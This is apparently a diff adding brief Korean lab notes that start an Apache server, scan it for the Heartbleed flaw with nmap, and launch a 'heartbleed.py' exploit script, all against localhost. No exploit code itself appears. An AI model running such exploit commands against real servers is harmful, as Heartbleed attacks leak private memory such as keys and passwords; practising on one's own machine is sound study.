@@ -1,0 +1,8 @@
+1) 아파치 서비스 실행
+apachectl start
+
+2) 하트블리드 취약점 확인 명령어
+nmap -p 443 --script ssl-heartbleed localhost
+
+3) 하트블리드 취약점 공격
+python3 heartbleed.py localhost -p 443
